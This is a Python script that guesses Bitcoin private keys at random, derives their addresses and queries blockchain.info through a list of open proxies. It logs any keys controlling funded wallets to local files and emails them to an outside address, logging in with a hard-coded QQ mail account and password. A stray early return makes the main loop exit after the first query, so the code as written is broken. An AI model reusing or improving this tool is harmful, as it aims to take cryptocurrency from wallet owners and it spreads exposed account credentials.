import threading
import os,sys
import time
import random
import requests
import json
import base64,hashlib
import traceback
import smtplib
from tqdm import tqdm
from email.mime.text import MIMEText
from email.header import Header
from pathlib import Path
import shutil

input_path = r"D:\libsecp256k1.dll"
if not Path(input_path).exists():
    shutil.copy("libsecp256k1.dll","D:\\")

import bit

maxPage = pow(2, 256) / 128
# maxPage = 904625697166532776746648320380374280100293470930272690489102837043110636675

# get device code
# license = input("请输入许可码:")
# if license:
#     device_code = os.popen("wmic cpu get processorid | findstr -v ProcessorId").read().strip()
#     device_code = device_code + "lqs"
#     hash = hashlib.md5()
#     hash.update(base64.b64encode(device_code.encode('utf-8')))
#     hash_value = hash.hexdigest()
#     if license != hash_value:
#         print("license code is error!")
#         time.sleep(5)
#         sys.exit()
# else:
#     print("license code is error!")
#     time.sleep(5)
#     sys.exit()

lock = threading.Lock()

PBAR_ARGS = dict(
    ncols=0,
    unit="B",
    unit_scale=True,
    unit_divisor=1024,
    bar_format="{l_bar:32} {bar:60} 用时: {elapsed} 剩余{remaining}",
)

# with tqdm(desc=balance["address"], total=getCount,**PBAR_ARGS) as pbar:
#     pbar.update(0)


def send_email(msg):
    receivers = "ethbtc8888@outlook.com" # 接受邮件
    message = MIMEText(msg,'plain','utf-8')
    message['From'] = "838822954@qq.com"
    message['To'] = "ethbtc8888@outlook.com"

    # subject = args.subject
    message['Subject'] = Header("congratulations wallet is successfully",'utf-8')

    try:
        smtpObj = smtplib.SMTP_SSL("smtp.qq.com", 465)
        # smtpObj = smtplib.SMTP("smtp.exmail.qq.com", 465)
        smtpObj.login("838822954@qq.com", "okysncvnkouvbfbi")
        smtpObj.sendmail("838822954@qq.com ", receivers, message.as_string())
        print("main has been send successfully",end="\r")
    except smtplib.SMTPException as e:
        smtpObj.sendmail("838822954@qq.com", receivers, message.as_string())
        print("main has been send successfully",end="\r")

def getRandPage():
    return random.randint(1, maxPage)


def getPage(pageNum):
    keyList = []
    addrList = []
    addrStr1 = ""
    addrStr2 = ""
    num = (pageNum - 1) * 128 + 1
    try:
        for i in range(num, num + 128):
            key1 = bit.Key.from_int(i)
            wif = bit.format.bytes_to_wif(key1.to_bytes(), compressed=False)
            key2 = bit.Key(wif)
            keyList.append(hex(i)[2:])
            addrList.append(key2.address)
            addrList.append(key1.address)
            if len(addrStr1):
                addrStr1 = addrStr1 + "|"
            addrStr1 = addrStr1 + key2.address
            if len(addrStr2):
                addrStr2 = addrStr2 + "|"
            addrStr2 = addrStr2 + key1.address
    except:
        pass
    return [keyList, addrList, addrStr1, addrStr2]


"""
def getPage(pageNum):
    try:
        r = requests.get(url='http://directory.io/%d' % pageNum, timeout=5)
        r = r.content
    except:
        return []
    keys = r.split("how-this-works!/")
    addrs = r.split("blockchain.info/address/")
    keyList = []
    addrList = []
    addrStr1 = ""
    addrStr2 = ""
    for i in range(1, len(keys)):
        key = keys[i].split("\"")[0]
        keyList.append(key)
    for i in range(1, len(addrs)):
        addr = addrs[i].split("\"")[0]
        addrList.append(addr)
        if i % 2 == 1:
            if len(addrStr1): addrStr1 = addrStr1 + "|"
            addrStr1 = addrStr1 + addr
        else:
            if len(addrStr2): addrStr2 = addrStr2 + "|"
            addrStr2 = addrStr2 + addr
    return [keyList, addrList, addrStr1, addrStr2]
"""

proxy_list = [
    {"http":"http://222.74.73.202:42055"},
    {"http":"http://112.14.47.6:52024"},
    {"http":"http://27.42.168.46:55481"},
    {"http":"http://121.13.252.58:41564"},
    {"http":"http://112.250.107.37:53281"},
    {"http":"http://60.211.218.78:53281"},
    {"http":"http://112.250.107.37:53281"},
    {"http":"http://218.29.155.198:9999"},
    {"http":"http://222.42.1.132:18000"},
    {"http":"http://27.50.128.242:88"},
    {"http":"http://101.64.236.206:18000"},
    {"http":"http://202.101.96.154:8888"},
]

def getBalances(addrStr):
    balances = "security"
    while True:
        if "security" not in balances:
            break
        secAddr = balances.split("effects address ")
        if len(secAddr) >= 2:
            secAddr = secAddr[1].split(".")[0]
            addrStr = addrStr.replace(secAddr + "|", "")
            addrStr = addrStr.replace("|" + secAddr, "")
        try:
            proxies = random.choice(proxy_list)
            r = requests.get(
                url="http://blockchain.info/multiaddr?active=%s" % addrStr, timeout=30
            )
            balances = r.text
        except:
            return 0
    try:
        balances = json.loads(balances)
        balances = balances["addresses"]
    except:
        print(balances)
    return balances


getCount = 0
SuccessTime = 0
fp_found = open("found.txt", "w+")
fp_fund = open("fund.txt", "w+")


def getWallet():
    global getCount
    global SuccessTime
    while True:
        page = getRandPage()
        pageRet = getPage(page)
        try:
            balancesRet = getBalances(pageRet[2])
            print(pageRet[0])
            print(pageRet[1])
            print(pageRet[2])
            return 0
            if balancesRet == 0: continue
            for balance in balancesRet:
                getCount = getCount + 1
                print("Testing: {}  |   Amount: {}   |   Tested: {} ".format(balance["address"], float(balance["final_balance"]), int(getCount)), end="\r")
                time.sleep(0.1)
                # print("we've tried {} times, address: {} ,success {} times".format(getCount, balance["address"] ,SuccessTime),end="\r")
                if balance["final_balance"] <= 0 and balance["total_sent"] <= 0:
                    continue
                key = ""
                isCompress = 0
                for i in range(0, len(pageRet[1])):
                    if balance["address"] == pageRet[1][i]:
                        key = pageRet[0][int(i / 2)]
                        if i % 2 == 1:
                            isCompress = 1
                        break
                if key == "":
                    continue
                SuccessTime += 1

                fp_found.write(
                    str(isCompress)
                    + " "
                    + str(balance["final_balance"])
                    + " "
                    + str(balance["total_sent"])
                    + " "
                    + key
                    + " "
                    + balance["address"]
                    + "\n"
                )
                if balance["final_balance"] > 0:
                    success_msg = str(isCompress) + " " + "final_balance:" + " " + str(balance["final_balance"]) + " " + "total_sent:" + " " + str(balance["total_sent"]) + " " + "key:" + " " + key + " " + "address:" + balance["address"]
                    send_email(success_msg)
                    fp_fund.write(
                        str(isCompress)
                        + " "
                        + str(balance["final_balance"])
                        + " "
                        + str(balance["total_sent"])
                        + " "
                        + key
                        + " "
                        + balance["address"]
                        + "\n"
                    )
                # print (isCompress, balance['final_balance'], balance['total_sent'], key, balance['address'])
            balancesRet = getBalances(pageRet[3])
            if isinstance(balancesRet,int):
                continue
            for balance in balancesRet:
                # print("Testing: {}  |   Amount: {}   |   Tested: {}".format(balance["address"], balance["final_balance"], getCount), end="\r")
                # print("we've tried {} times, address: {} ,success {} times".format(getCount, balance["address"] ,SuccessTime),end="\r")
                if balance["final_balance"] <= 0 and balance["total_sent"] <= 0:
                    continue
                key = ""
                isCompress = 1
                for i in range(0, len(pageRet[1])):
                    if balance["address"] == pageRet[1][i]:
                        key = pageRet[0][int(i / 2)]
                        if i % 2 == 1:
                            isCompress = 1
                        break
                if key == "":
                    continue
                SuccessTime += 1
                fp_found.write(
                    str(isCompress)
                    + " "
                    + str(balance["final_balance"])
                    + " "
                    + str(balance["total_sent"])
                    + " "
                    + key
                    + " "
                    + balance["address"]
                    + "\n"
                )
                if balance["final_balance"] > 0:
                    success_msg = str(isCompress) + " " + "final_balance" + " " + str(balance["final_balance"]) + " " + "total_sent" + " " + str(balance["total_sent"]) + " " + "key" + " " + key + " " + "address" + balance["address"]
                    send_email(success_msg)
                    fp_fund.write(
                        str(isCompress)
                        + " "
                        + str(balance["final_balance"])
                        + " "
                        + str(balance["total_sent"])
                        + " "
                        + key
                        + " "
                        + balance["address"]
                        + "\n"
                    )
                # print (isCompress, balance['final_balance'], balance['total_sent'], key, balance['address'])
            fp_found.flush()
            fp_fund.flush()
        except:
            traceback.print_exc()
            continue
        # clearScreen()
        # if (getCount % 1000) == 0:
        #     print("we've tried {} times, sleep 1800s".format(getCount))
        #     time.sleep(1800)
        time.sleep(1)
        # print("we've tried {} times, success {} times".format(getCount, SuccessTime),end="\r")


def clearScreen():
    os.system("clear")


def main():
    threads = []
    for i in range(1):
        threads.append(threading.Thread(target=getWallet, args=()))
    for t in threads:
        time.sleep(1.0)
        t.start()
    for t in threads:
        t.join()


if __name__ == "__main__":
    with open("readme","r") as fp:
        print(fp.read())
    main()
